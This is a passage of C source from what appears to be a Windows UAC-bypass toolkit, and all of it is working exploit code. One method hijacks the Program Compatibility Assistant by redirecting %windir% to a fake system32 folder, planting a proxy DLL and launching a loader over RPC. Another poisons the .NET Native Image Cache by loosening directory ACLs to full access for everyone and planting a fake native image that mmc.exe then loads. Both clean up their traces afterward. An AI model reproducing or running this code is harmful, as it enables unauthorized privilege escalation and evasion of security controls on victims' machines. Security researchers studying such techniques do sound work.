            NULL))
        {
            break;
        }

        if (dwValuesCount == 0)
            break;

        RtlSecureZeroMemory(&szValue, sizeof(szValue));

        for (i = 0; i < dwValuesCount; i++) {

            dwType = 0;
            cchValue = MAX_PATH;

            if (ERROR_SUCCESS == RegEnumValue(hKey,
                i,
                (LPWSTR)&szValue,
                (LPDWORD)&cchValue,
                NULL,
                &dwType,
                NULL,
                NULL))
            {
                if (dwType == REG_BINARY) {

                    if (NULL != _strstri(szValue, lpLoaderName)) {

                        if (ERROR_SUCCESS == RegDeleteValue(hKey, szValue))
                            cRemoved++;

                    }
                }

                szValue[0] = 0;
            }

        }


    } while (FALSE);

    RegCloseKey(hKey);

    return cRemoved;
}

typedef struct _PCA_LOADER_BLOCK {
    ULONG OpResult;
    WCHAR szLoader[MAX_PATH + 1];
} PCA_LOADER_BLOCK;

/*
* ucmxExamineTaskhost
*
* Purpose:
*
* Find all tasks registered with the host process and stop them.
*
*/
BOOL ucmxExamineTaskhost(
    _In_ HANDLE UniqueProcessId
)
{
    HRESULT hr = E_FAIL;
    ULONG processId;
    LONG i, cTasks = 0;
    VARIANT varDummy, varIndex;
    ITaskService* pService = NULL;
    IRunningTaskCollection* pTasks = NULL;
    IRunningTask* pTask;
    TASK_STATE taskState;

    do {

        hr = CoCreateInstance(&CLSID_TaskScheduler,
            NULL,
            CLSCTX_INPROC_SERVER,
            &IID_ITaskService,
            (void**)&pService);

        if (FAILED(hr))
            break;

        VariantInit(&varDummy);

        hr = pService->lpVtbl->Connect(pService,
            varDummy,
            varDummy,
            varDummy,
            varDummy);

        if (FAILED(hr))
            break;

        hr = pService->lpVtbl->GetRunningTasks(pService,
            TASK_ENUM_HIDDEN,
            &pTasks);

        if (FAILED(hr))
            break;

        hr = pTasks->lpVtbl->get_Count(pTasks, &cTasks);

        if (FAILED(hr))
            break;

        varIndex.vt = VT_INT;

        for (i = 1; i <= cTasks; i++) {

            varIndex.lVal = i;

            hr = pTasks->lpVtbl->get_Item(pTasks, varIndex, &pTask);
            if (SUCCEEDED(hr)) {

                processId = 0;
                hr = pTask->lpVtbl->get_EnginePID(pTask, &processId);
                if (SUCCEEDED(hr) && processId == HandleToUlong(UniqueProcessId)) {

                    hr = pTask->lpVtbl->get_State(pTask, &taskState);
                    if (taskState == TASK_STATE_RUNNING) {
                        hr = pTask->lpVtbl->Stop(pTask);
                    }
                }
                pTask->lpVtbl->Release(pTask);
            }
        }


    } while (FALSE);

    if (pTasks)
        pTasks->lpVtbl->Release(pTasks);

    if (pService)
        pService->lpVtbl->Release(pService);

    return SUCCEEDED(hr);
}

/*
* ucmxEnumTaskhost
*
* Purpose:
*
* Callback for taskhost task enumeration.
*
*/
BOOL CALLBACK ucmxEnumTaskhost(
    _In_ PSYSTEM_PROCESSES_INFORMATION ProcessEntry,
    _In_ PVOID UserContext
)
{
    PUNICODE_STRING targetProcess = (PUNICODE_STRING)UserContext;

    if (!RtlEqualUnicodeString(&ProcessEntry->ImageName, targetProcess, TRUE))
        return FALSE;

    ucmxExamineTaskhost(ProcessEntry->UniqueProcessId);

    return FALSE;
}

/*
* ucmPcaMethod
*
* Purpose:
*
* Bypass UAC using Program Compatibility Assistant.
*
* AlwaysNotify compatible.
*
*/
NTSTATUS ucmPcaMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL fEnvSet = FALSE, fDirCreated = FALSE, fLoaderCreated = FALSE, fUsePca = TRUE;
    ULONG ulResult = 0, seedValue;
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED, ntStatus;
    HRESULT hr_init;
    SIZE_T cchDirName = 0, nLen, viewSize = PAGE_SIZE;

    HANDLE hSharedSection = NULL, hSharedEvent = NULL;
    HANDLE hShellProcess = NULL;

    UNICODE_STRING uStrTaskhost = RTL_CONSTANT_STRING(TASKHOSTW_EXE);

    RPC_BINDING_HANDLE rpcHandle = NULL;
    RPC_STATUS rpcStatus;

    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInfo;

    PCA_LOADER_BLOCK* pvLoaderBlock = NULL;

    LARGE_INTEGER liValue;

    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING usObjectName;

    WCHAR szBuffer[MAX_PATH * 2], szEnvVar[MAX_PATH * 2];
    WCHAR szLoader[MAX_PATH * 2];
    WCHAR szLoaderName[64];

    WCHAR szLoaderCmdLine[2];
    WCHAR szObjectName[MAX_PATH];

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
    RtlSecureZeroMemory(&szLoader, sizeof(szLoader));
    RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
    RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));

    do {

        if (!ucmxRunService(T_PCASVC))
            break;

        if (g_ctx->dwBuildNumber < NT_WIN8_RTM) {
            fUsePca = FALSE;
        }

        RtlSecureZeroMemory(&szLoaderName, sizeof(szLoaderName));

        seedValue = ~GetTickCount();
        liValue.LowPart = RtlRandomEx(&seedValue);
        seedValue = GetTickCount();
        liValue.HighPart = RtlRandomEx(&seedValue);

        supBinTextEncode(liValue.QuadPart, szLoaderName);
        _strcat(szLoaderName, TEXT(".exe"));

        //
        // Create shared loader section.
        //
        RtlSecureZeroMemory(&szObjectName, sizeof(szObjectName));
        _strcpy(szObjectName, TEXT("\\Sessions\\"));
        ultostr(NtCurrentPeb()->SessionId, _strend(szObjectName));
        _strcat(szObjectName, TEXT("\\BaseNamedObjects\\"));
        supGenerateSharedObjectName((WORD)FUBUKI_PCA_SECTION_ID, _strend(szObjectName));

        liValue.QuadPart = PAGE_SIZE;

        RtlInitUnicodeString(&usObjectName, szObjectName);
        InitializeObjectAttributes(&obja, &usObjectName, OBJ_CASE_INSENSITIVE, NULL, NULL);

        ntStatus = NtCreateSection(&hSharedSection,
            SECTION_ALL_ACCESS,
            &obja,
            &liValue,
            PAGE_READWRITE,
            SEC_COMMIT,
            NULL);

        if (!NT_SUCCESS(ntStatus) || (hSharedSection == NULL)) {
            break;
        }

        ntStatus = NtMapViewOfSection(
            hSharedSection,
            NtCurrentProcess(),
            &pvLoaderBlock,
            0,
            PAGE_SIZE,
            NULL,
            &viewSize,
            ViewUnmap,
            MEM_TOP_DOWN,
            PAGE_READWRITE);

        if (!NT_SUCCESS(ntStatus) || (pvLoaderBlock == NULL)) {
            break;
        }

        //
        // Create completion event.
        //
        _strcpy(szObjectName, TEXT("\\BaseNamedObjects\\"));
        supGenerateSharedObjectName((WORD)FUBUKI_PCA_EVENT_ID, _strend(szObjectName));

        RtlInitUnicodeString(&usObjectName, szObjectName);
        InitializeObjectAttributes(&obja, &usObjectName, OBJ_CASE_INSENSITIVE, NULL, NULL);

        ntStatus = NtCreateEvent(&hSharedEvent,
            EVENT_ALL_ACCESS,
            &obja,
            SynchronizationEvent,
            FALSE);

        if (!NT_SUCCESS(ntStatus) || (hSharedEvent == NULL)) {
            break;
        }

        //
        // Stop WDI\ResolutionHost task.
        //
        if (!supStopTaskByName(
            TEXT("Microsoft\\Windows\\WDI"),
            TEXT("ResolutionHost")))
        {
            break;
        }

        supEnumProcessesForSession(NtCurrentPeb()->SessionId,
            (pfnEnumProcessCallback)ucmxEnumTaskhost, (PVOID)&uStrTaskhost);

        //
        // Create destination dir "system32"
        //
        _strcpy(szBuffer, g_ctx->szCurrentDirectory);
        _strcat(szBuffer, SYSTEM32_DIR_NAME);
        cchDirName = _strlen(szBuffer);
        if (!CreateDirectory(szBuffer, NULL)) {
            if (GetLastError() != ERROR_ALREADY_EXISTS) {
                break;
            }
        }

        fDirCreated = TRUE;

        //
        // Convert payload for dll hijack.
        //
        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            FUBUKI_ENTRYPOINT_PCADLL,
            FALSE))
        {
            break;
        }

        //
        // Drop payload to the fake system32 dir as PCADM.DLL.
        //
        szBuffer[cchDirName] = 0;
        _strcat(szBuffer, TEXT("\\"));
        _strcat(szBuffer, PCADM_DLL);
        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize)) {
            break;
        }

        //
        // Convert dll to exe to be loader task.
        //
        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            FUBUKI_ENTRYPOINT_PCAEXE,
            TRUE))
        {
            break;
        }

        //
        // Drop loader to the temp dir.
        //
        _strcpy(szLoader, g_ctx->szCurrentDirectory);
        _strcat(szLoader, szLoaderName);
        fLoaderCreated = supWriteBufferToFile(szLoader, ProxyDll, ProxyDllSize);
        if (!fLoaderCreated) {
            break;
        }

        //
        // Remember loader name
        //
        _strcpy(pvLoaderBlock->szLoader, szLoader);

        //
        // Set new %windir% environment variable.
        //
        _strcpy(szEnvVar, g_ctx->szCurrentDirectory);
        nLen = _strlen(szEnvVar);
        if (szEnvVar[nLen - 1] == L'\\') {
            szEnvVar[nLen - 1] = 0;
        }

        fEnvSet = supSetEnvVariable2(FALSE, NULL, T_WINDIR, szEnvVar);
        if (fEnvSet == FALSE) {
            break;
        }

        //
        // Set loader command line.
        //
        szLoaderCmdLine[0] = (fUsePca) ? TEXT('1') : TEXT('3');
        szLoaderCmdLine[1] = 0;

        //
        // Run loader suspended with parent set to shell process.
        //
        if (fUsePca) {

            hShellProcess = supOpenShellProcess(PROCESS_CREATE_PROCESS);
            if (hShellProcess == NULL) {
                break;
            }

            processInfo.hProcess = supRunProcessFromParent(hShellProcess,
                szLoader,
                szLoaderCmdLine,
                NULL,
                CREATE_SUSPENDED | CREATE_NO_WINDOW,
                0,
                &processInfo.hThread);

        }
        else {

            startupInfo.cb = sizeof(startupInfo);
            if (!CreateProcess(
                szLoader,
                szLoaderCmdLine,
                NULL,
                NULL,
                FALSE,
                CREATE_SUSPENDED | CREATE_NO_WINDOW,
                NULL,
                NULL,
                &startupInfo,
                &processInfo))
            {
                break;
            }

        }

        if (processInfo.hProcess == NULL) {
            break;
        }

        rpcStatus = supCreateBindingHandle(PCASVC_RPC, &rpcHandle);

        if (rpcStatus == RPC_S_OK) {

            if (fUsePca) {

                __try {

                    rpcStatus = RAiMonitorProcess(
                        rpcHandle,
                        (ULONG_PTR)processInfo.hProcess,
                        0,
                        szLoader,
                        szLoaderCmdLine,
                        g_ctx->szCurrentDirectory,
                        PCA_MONITOR_PROCESS_NORMAL);


                }
                __except (EXCEPTION_EXECUTE_HANDLER) {
                    rpcStatus = GetExceptionCode();
                }


            }
            else {

                __try {

                    rpcStatus = RAiNotifyUserCallbackExceptionProcess(
                        rpcHandle,
                        szLoader,
                        1,
                        processInfo.dwProcessId);

                }
                __except (EXCEPTION_EXECUTE_HANDLER) {
                    rpcStatus = GetExceptionCode();
                }

            }

            RpcBindingFree(&rpcHandle);
        }

        if (rpcStatus != RPC_S_OK)
            break;

        ResumeThread(processInfo.hThread);

        WaitForSingleObject(processInfo.hProcess, INFINITE);

        if (fUsePca) {

            GetExitCodeProcess(processInfo.hProcess, &ulResult);

            if (ulResult != 0)
                break;
        }

        WaitForSingleObject(hSharedEvent, 20 * 1000);

        MethodResult = (pvLoaderBlock->OpResult == FUBUKI_PCA_ALL_RUN) ? STATUS_SUCCESS : STATUS_ACCESS_DENIED;

    } while (FALSE);

    Sleep(2000);

    //
    // Cleanup.
    //
    if (processInfo.hThread)
        CloseHandle(processInfo.hThread);

    if (processInfo.hProcess) {
        TerminateProcess(processInfo.hProcess, ERROR_SUCCESS);
        CloseHandle(processInfo.hProcess);
    }

    if (hSharedEvent)
        NtClose(hSharedEvent);

    if (pvLoaderBlock)
        NtUnmapViewOfSection(NtCurrentProcess(), (PVOID)pvLoaderBlock);

    if (hSharedSection)
        NtClose(hSharedSection);

    if (fEnvSet)
        supSetEnvVariable(TRUE, NULL, T_WINDIR, NULL);

    if (fUsePca) {

        ucmxRemoveLoaderEntryFromRegistry(
            HKEY_CURRENT_USER,
            T_PCA_STORE,
            szLoaderName);

    }
    else {

        ucmxRemoveLoaderEntryFromRegistry(
            HKEY_LOCAL_MACHINE,
            T_APPCOMPAT_LAYERS,
            szLoaderName);

        ucmxRemoveLoaderEntryFromRegistry(
            HKEY_CURRENT_USER,
            T_PCA_PERSISTED,
            szLoaderName);

    }

    if (fLoaderCreated) {
        DeleteFile(szLoader);
    }

    if (fDirCreated) {
        DeleteFile(szBuffer);
        szBuffer[cchDirName] = 0;
        RemoveDirectory(szBuffer);
    }

    if (SUCCEEDED(hr_init))
        CoUninitialize();

    if (MethodResult != STATUS_SUCCESS)
        supSetGlobalCompletionEvent();

    return MethodResult;
}

NTSTATUS ucmxGenerateAUX(
    _In_ LPCWSTR AssemblyName,
    _Out_ PVOID* AuxData,
    _Out_ PSIZE_T AuxDataSize,
    _Out_opt_ GUID* ModuleGuid
)
{
    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
    LPWSTR lpAssemblyFilePath = NULL;

    HRESULT hr;
    IAssemblyCache* asmCache = NULL;
    IAssemblyEnum* asmEnum = NULL;
    IAssemblyName* asmName = NULL;

    GUID mvid;

    LPWSTR lpAssemblyName = NULL, lpDisplayName = NULL;
    LPSTR lpDisplayNameANSI = NULL;

    BOOL bFound = FALSE;
    SIZE_T auxSize = 0;
    PBYTE auxPtr = NULL, pbPad;
    PULONG dataPtr;

    SIZE_T cchName = 0, cchDisplayName = 0, padBytes, i;

    *AuxData = NULL;
    *AuxDataSize = 0;

    if (!fusUtilInitFusion((g_ctx->dwBuildNumber < NT_WIN8_RTM) ? 2 : 4))
        return ntStatus;

    RtlSecureZeroMemory(&mvid, sizeof(mvid));

    do {

        hr = g_ctx->FusionContext.CreateAssemblyEnum(&asmEnum, NULL, NULL, ASM_CACHE_GAC, NULL);
        if ((FAILED(hr)) || (asmEnum == NULL))
            break;

        hr = g_ctx->FusionContext.CreateAssemblyCache(&asmCache, 0);
        if ((FAILED(hr)) || (asmCache == NULL))
            break;


        //
        // Locate assembly and remember it name/display name.
        //
        while ((hr = asmEnum->lpVtbl->GetNextAssembly(asmEnum, NULL, &asmName, 0)) == S_OK) {

            if (SUCCEEDED(fusUtilGetAssemblyName(asmName,
                &lpAssemblyName,
                &cchName,
                &lpDisplayName,
                &cchDisplayName)))
            {

                if (_strcmpi(AssemblyName, lpAssemblyName) == 0) {
                    bFound = TRUE;
                    break;
                }
                else {
                    supHeapFree(lpAssemblyName);
                    supHeapFree(lpDisplayName);
                    lpAssemblyName = NULL;
                    lpDisplayName = NULL;
                }

            }

            asmName->lpVtbl->Finalize(asmName);
            asmName->lpVtbl->Release(asmName);
        }

        if (FAILED(hr) || bFound == FALSE)
            break;

        lpDisplayNameANSI = (LPSTR)supHeapAlloc((1 + cchDisplayName) * sizeof(CHAR));
        if (lpDisplayNameANSI == NULL)
            break;

        WideCharToMultiByte(CP_ACP,
            0,
            lpDisplayName,
            (INT)cchDisplayName,
            lpDisplayNameANSI,
            (INT)(1 + cchDisplayName),
            NULL,
            NULL);

        //
        // Query assembly filepath.
        //
        hr = fusUtilGetAssemblyPath(asmCache, AssemblyName, &lpAssemblyFilePath);
        if (FAILED(hr))
            break;

        //
        // Remember MVID.
        //
        if (!fusUtilGetImageMVID(lpAssemblyFilePath, &mvid))
            break;

        //
        // Allocate buffer for AUX data.
        //
        auxSize = ALIGN_UP_TYPE(100 + (SIZE_T)cchDisplayName, sizeof(ULONG));
        auxPtr = (PBYTE)supHeapAlloc(auxSize);
        if (auxPtr == NULL)
            break;

        dataPtr = (PULONG)auxPtr;

        //
        // Magic values go brrr.
        //

        *dataPtr++ = 0x5;
        *dataPtr++ = (ULONG)auxSize - 8;
        *dataPtr++ = 0xB;
        *dataPtr++ = (ULONG)auxSize - 16;
        *dataPtr++ = 0xD;
        *dataPtr++ = (ULONG)auxSize - 100;
        RtlCopyMemory(dataPtr, lpDisplayNameANSI, cchDisplayName);

        padBytes = (auxSize - 100) - cchDisplayName;

        pbPad = (PBYTE)RtlOffsetToPointer(dataPtr, cchDisplayName);

        for (i = 0; i < padBytes; i++)
            *pbPad++ = 0xCC;

        dataPtr = (PULONG)RtlOffsetToPointer(dataPtr, cchDisplayName + padBytes);

        *dataPtr++ = 0x7;
        *dataPtr++ = 0x4;
        *dataPtr++ = 0x1109;
        *dataPtr++ = 0x2;
        *dataPtr++ = 0x8;
        *dataPtr++ = 0;
        *dataPtr++ = 0;
        *dataPtr++ = 0xF;
        *dataPtr++ = 0x4;
        *dataPtr++ = 0;
        *dataPtr++ = 0x10;
        *dataPtr++ = 0x4;
        *dataPtr++ = 0x1;
        *dataPtr++ = 0x9;
        *dataPtr++ = 0x10;

        RtlCopyMemory(dataPtr, &mvid, sizeof(mvid));

        *AuxData = auxPtr;
        *AuxDataSize = auxSize;
        if (ModuleGuid) *ModuleGuid = mvid;

        ntStatus = STATUS_SUCCESS;

    } while (FALSE);

    if (lpAssemblyFilePath)
        supHeapFree(lpAssemblyFilePath);

    if (lpAssemblyName)
        supHeapFree(lpAssemblyName);
    if (lpDisplayName)
        supHeapFree(lpDisplayName);
    if (lpDisplayNameANSI)
        supHeapFree(lpDisplayNameANSI);

    if (asmName) {
        asmName->lpVtbl->Finalize(asmName);
        asmName->lpVtbl->Release(asmName);
    }

    if (asmCache)
        asmCache->lpVtbl->Release(asmCache);

    if (asmEnum)
        asmEnum->lpVtbl->Release(asmEnum);

    if (!NT_SUCCESS(ntStatus)) {

        if (auxPtr)
            supHeapFree(auxPtr);

    }

    return ntStatus;
}

/*
* ucmNICPoisonMethod2
*
* Purpose:
*
* Bypass UAC by by Dll hijack of Native Image Cache.
*
*/
NTSTATUS ucmNICPoisonMethod2(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED, ntStatus;
    WCHAR szFileName[MAX_PATH * 2];
    WCHAR szTargetDir[MAX_PATH * 2];
    WCHAR szCacheDir[MAX_PATH * 2];
    WCHAR szMVID[64];

    LPWSTR oldSecurity = NULL;
    SIZE_T dirLen;
    GUID targetMVID;

    PVOID auxData = NULL;
    SIZE_T auxDataSize;

    BOOL bNeedSecurityReset = FALSE, bNeedRestore = FALSE;
    BOOL IsWin7 = (g_ctx->dwBuildNumber < NT_WIN8_RTM);

    do {

        //
        // Build cache path.
        //
        _strcpy(szCacheDir, g_ctx->szSystemRoot);
        _strcat(szCacheDir, TEXT("assembly\\NativeImages_"));

        if (IsWin7)
            _strcat(szCacheDir, NET2_DIR);
        else
            _strcat(szCacheDir, NET4_DIR);

#ifdef _WIN64
        _strcat(szCacheDir, TEXT("_64"));
#else
        _strcat(szCacheDir, TEXT("_32"));
#endif
        ntStatus = ucmxGenerateAUX(ASSEMBLY_MMCEX, &auxData, &auxDataSize, NULL);
        if (!NT_SUCCESS(ntStatus)) {
            MethodResult = ntStatus;
            break;
        }

        RtlSecureZeroMemory(&szMVID, sizeof(szMVID));
        RtlSecureZeroMemory(&targetMVID, sizeof(targetMVID));
        if (!fusUtilGetAssemblyMVIDFromZapCache(ASSEMBLY_MMCEX, &targetMVID))
            break;

        fusUtilBinToUnicodeHex((PBYTE)&targetMVID, sizeof(GUID), szMVID);

        //
        // Remember old directory security permissions.
        //
        if (!ucmMasqueradedGetObjectSecurityCOM(szCacheDir,
            DACL_SECURITY_INFORMATION,
            SE_FILE_OBJECT,
            &oldSecurity))
        {
            break;
        }

        //
        // Reset target file permissions.
        //
        if (!ucmMasqueradedSetObjectSecurityCOM(szCacheDir,
            DACL_SECURITY_INFORMATION,
            SE_FILE_OBJECT,
            T_SDDL_EVERYONE_FULL_ACCESS))
        {
            break;
        }

        bNeedSecurityReset = TRUE;

        //
        // Move MMCEx to MMCEx.$
        //
        _strcpy(szFileName, szCacheDir);
        _strcat(szFileName, MMCEX_DIR);

        _strcpy(szTargetDir, szFileName);
        _strcat(szTargetDir, TEXT(".$"));

        if (!MoveFileEx(szFileName,
            szTargetDir,
            MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH))
        {
            break;
        }

        bNeedRestore = TRUE;

        //
        // 1. MMCEx
        // 2. MMCEx\<MVID>\
        // 3. MMCEx\<MVID>\MMCEx.ni.dll
        // 4. MMCEx\<MVID>\MMCEx.ni.aux
        //
        // 1. MMCEx
        //
        if (!CreateDirectory(szFileName, NULL))
            if (GetLastError() != ERROR_ALREADY_EXISTS) {
                break;
            }

        //
        // 2. Subdirectory <MVID>
        //
        supPathAddBackSlash(szFileName);
        _strcat(szFileName, szMVID);
        if (!CreateDirectory(szFileName, NULL))
            if (GetLastError() != ERROR_ALREADY_EXISTS) {
                break;
            }

        //
        // 3. Drop payload.
        //
        supPathAddBackSlash(szFileName);
        dirLen = _strlen(szFileName);
        _strcat(szFileName, MMCEX_NI_DLL);
        if (!supWriteBufferToFile(szFileName, ProxyDll, ProxyDllSize)) {
            break;
        }

        //
        // 4. Drop aux payload.
        //
        szFileName[dirLen] = 0;
        _strcat(szFileName, MMCEX_NI_DLL_AUX);
        if (!supWriteBufferToFile(szFileName, auxData, (ULONG)auxDataSize)) {
            break;
        }

        //
        // Run target.
        //
        _strcpy(szFileName, g_ctx->szSystemDirectory);
        _strcat(szFileName, MMC_EXE);

        if (supRunProcess2(szFileName,
            WF_MSC,
            NULL,
            SW_SHOW,
            SUPRUNPROCESS_TIMEOUT_DEFAULT))
        {
            MethodResult = STATUS_SUCCESS;
        }

    } while (FALSE);


    if (bNeedRestore) {

        //
        // Remove fake directory.
        //
        _strcpy(szFileName, szCacheDir);
        _strcat(szFileName, MMCEX_DIR);
        supRemoveDirectoryRecursive(szFileName);

        //
        // Restore original MMCEx directory.
        //
        _strcat(szFileName, TEXT(".$"));
        _strcpy(szTargetDir, szCacheDir);
        _strcat(szTargetDir, MMCEX_DIR);
        MoveFileEx(szFileName,
            szTargetDir,
            MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH);

    }

    //
    // Revert directory security.
    //
    if (oldSecurity) {

        if (bNeedSecurityReset) {
            ucmMasqueradedSetObjectSecurityCOM(szCacheDir,
                DACL_SECURITY_INFORMATION,
                SE_FILE_OBJECT,
                oldSecurity);
        }

        CoTaskMemFree(oldSecurity);
    }

    if (auxData)
        supHeapFree(auxData);

    if (!NT_SUCCESS(MethodResult))
        supSetGlobalCompletionEvent();

    return MethodResult;
}
